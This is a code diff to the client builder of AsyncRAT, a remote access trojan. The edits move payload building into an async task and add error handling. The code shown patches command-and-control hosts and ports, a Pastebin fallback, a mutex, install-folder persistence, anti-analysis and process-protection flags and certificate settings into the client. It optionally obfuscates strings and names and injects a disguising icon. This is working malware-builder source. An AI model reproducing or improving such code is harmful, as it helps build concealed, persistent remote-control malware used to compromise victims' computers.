@@ -12,6 +12,7 @@ using System.IO;
 using System.Linq;
 using dnlib.DotNet.Emit;
 using Server.RenamingObfuscation;
+using System.Threading.Tasks;
 
 namespace Server.Forms
 {
@@ -170,7 +171,7 @@ namespace Server.Forms
             catch { }
         }
 
-        private void BtnBuild_Click(object sender, EventArgs e)
+        private async void BtnBuild_Click(object sender, EventArgs e)
         {
             if (listBoxIP.Items.Count == 0 || listBoxPort.Items.Count == 0) return;
 
@@ -195,22 +196,26 @@ namespace Server.Forms
                     saveFileDialog1.FileName = "Client";
                     if (saveFileDialog1.ShowDialog() == DialogResult.OK)
                     {
-                        WriteSettings(asmDef);
-                        if (chkObfu.Checked)
+                        btnBuild.Enabled = false;
+                        await Task.Run(() =>
                         {
-                            EncryptString.DoEncrypt(asmDef);
-                            Renaming.DoRenaming(asmDef);
-                        }
-                        asmDef.Write(saveFileDialog1.FileName);
-                        asmDef.Dispose();
-                        if (btnAssembly.Checked)
-                        {
-                            WriteAssembly(saveFileDialog1.FileName);
-                        }
-                        if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
-                        {
-                            IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
-                        }
+                            WriteSettings(asmDef);
+                            if (chkObfu.Checked)
+                            {
+                                EncryptString.DoEncrypt(asmDef);
+                                Renaming.DoRenaming(asmDef);
+                            }
+                            asmDef.Write(saveFileDialog1.FileName);
+                            asmDef.Dispose();
+                            if (btnAssembly.Checked)
+                            {
+                                WriteAssembly(saveFileDialog1.FileName);
+                            }
+                            if (chkIcon.Checked && !string.IsNullOrEmpty(txtIcon.Text))
+                            {
+                                IconInjector.InjectIcon(saveFileDialog1.FileName, txtIcon.Text);
+                            }
+                        });
                         MessageBox.Show("Done!", "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Information);
                         SaveSettings();
                         this.Close();
@@ -220,6 +225,7 @@ namespace Server.Forms
             catch (Exception ex)
             {
                 MessageBox.Show(ex.Message, "AsyncRAT | Builder", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                btnBuild.Enabled = true;
             }
         }
 
@@ -313,101 +319,108 @@ namespace Server.Forms
 
         private void WriteSettings(ModuleDefMD asmDef)
         {
-            var key = Methods.GetRandomString(32);
-            var aes = new Aes256(key);
-            var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
-            var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert));
-            byte[] signature;
-            using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
+            try
             {
-                var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
-                signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
-            }
+                var key = Methods.GetRandomString(32);
+                var aes = new Aes256(key);
+                var caCertificate = new X509Certificate2(Settings.CertificatePath, "", X509KeyStorageFlags.Exportable);
+                var serverCertificate = new X509Certificate2(caCertificate.Export(X509ContentType.Cert));
+                byte[] signature;
+                using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
+                {
+                    var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
+                    signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
+                }
 
-            foreach (TypeDef type in asmDef.Types)
-            {
-                if (type.Name == "Settings")
-                    foreach (MethodDef method in type.Methods)
-                    {
-                        if (method.Body == null) continue;
-                        for (int i = 0; i < method.Body.Instructions.Count(); i++)
+                foreach (TypeDef type in asmDef.Types)
+                {
+                    if (type.Name == "Settings")
+                        foreach (MethodDef method in type.Methods)
                         {
-                            if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
+                            if (method.Body == null) continue;
+                            for (int i = 0; i < method.Body.Instructions.Count(); i++)
                             {
-                                if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
+                                if (method.Body.Instructions[i].OpCode == OpCodes.Ldstr)
                                 {
-                                    if (chkPastebin.Enabled && chkPastebin.Checked)
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Ports%")
                                     {
-                                        method.Body.Instructions[i].Operand = aes.Encrypt("null");
-                                    }
-                                    else
-                                    {
-                                        List<string> LString = new List<string>();
-                                        foreach (string port in listBoxPort.Items)
+                                        if (chkPastebin.Enabled && chkPastebin.Checked)
                                         {
-                                            LString.Add(port);
+                                            method.Body.Instructions[i].Operand = aes.Encrypt("null");
                                         }
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
-                                    }
-                                }
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
-                                {
-                                    if (chkPastebin.Enabled && chkPastebin.Checked)
-                                    {
-                                        method.Body.Instructions[i].Operand = aes.Encrypt("null");
-
-                                    }
-                                    else
-                                    {
-                                        List<string> LString = new List<string>();
-                                        foreach (string ip in listBoxIP.Items)
+                                        else
                                         {
-                                            LString.Add(ip);
+                                            List<string> LString = new List<string>();
+                                            foreach (string port in listBoxPort.Items)
+                                            {
+                                                LString.Add(port);
+                                            }
+                                            method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
                                         }
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
                                     }
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Hosts%")
+                                    {
+                                        if (chkPastebin.Enabled && chkPastebin.Checked)
+                                        {
+                                            method.Body.Instructions[i].Operand = aes.Encrypt("null");
+
+                                        }
+                                        else
+                                        {
+                                            List<string> LString = new List<string>();
+                                            foreach (string ip in listBoxIP.Items)
+                                            {
+                                                LString.Add(ip);
+                                            }
+                                            method.Body.Instructions[i].Operand = aes.Encrypt(string.Join(",", LString));
+                                        }
+                                    }
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Install%")
+                                        method.Body.Instructions[i].Operand = aes.Encrypt(checkBox1.Checked.ToString().ToLower());
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Folder%")
+                                        method.Body.Instructions[i].Operand = comboBoxFolder.Text;
+
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%File%")
+                                        method.Body.Instructions[i].Operand = textFilename.Text;
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
+                                        method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("AsyncRAT ", ""));
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
+                                        method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
+                                        method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
+                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkAnti.Checked.ToString().ToLower());
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Certificate%")
+                                        method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
+                                        method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%BDOS%")
+                                        method.Body.Instructions[i].Operand = aes.Encrypt(chkBdos.Checked.ToString().ToLower());
+
+                                    if (method.Body.Instructions[i].Operand.ToString() == "%Pastebin%")
+                                        if (chkPastebin.Checked)
+                                            method.Body.Instructions[i].Operand = aes.Encrypt(txtPastebin.Text);
+                                        else
+                                            method.Body.Instructions[i].Operand = aes.Encrypt("null");
                                 }
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%Install%")
-                                    method.Body.Instructions[i].Operand = aes.Encrypt(checkBox1.Checked.ToString().ToLower());
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%Folder%")
-                                    method.Body.Instructions[i].Operand = comboBoxFolder.Text;
-
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%File%")
-                                    method.Body.Instructions[i].Operand = textFilename.Text;
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%Version%")
-                                    method.Body.Instructions[i].Operand = aes.Encrypt(Settings.Version.Replace("AsyncRAT ", ""));
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%Key%")
-                                    method.Body.Instructions[i].Operand = Convert.ToBase64String(Encoding.UTF8.GetBytes(key));
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%MTX%")
-                                    method.Body.Instructions[i].Operand = aes.Encrypt(txtMutex.Text);
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%Anti%")
-                                    method.Body.Instructions[i].Operand = aes.Encrypt(chkAnti.Checked.ToString().ToLower());
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%Certificate%")
-                                    method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(serverCertificate.Export(X509ContentType.Cert)));
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%Serversignature%")
-                                    method.Body.Instructions[i].Operand = aes.Encrypt(Convert.ToBase64String(signature));
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%BDOS%")
-                                    method.Body.Instructions[i].Operand = aes.Encrypt(chkBdos.Checked.ToString().ToLower());
-
-                                if (method.Body.Instructions[i].Operand.ToString() == "%Pastebin%")
-                                    if (chkPastebin.Checked)
-                                        method.Body.Instructions[i].Operand = aes.Encrypt(txtPastebin.Text);
-                                    else
-                                        method.Body.Instructions[i].Operand = aes.Encrypt("null");
                             }
                         }
-                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                throw new ArgumentException("WriteSettings: " + ex.Message);
             }
         }
 
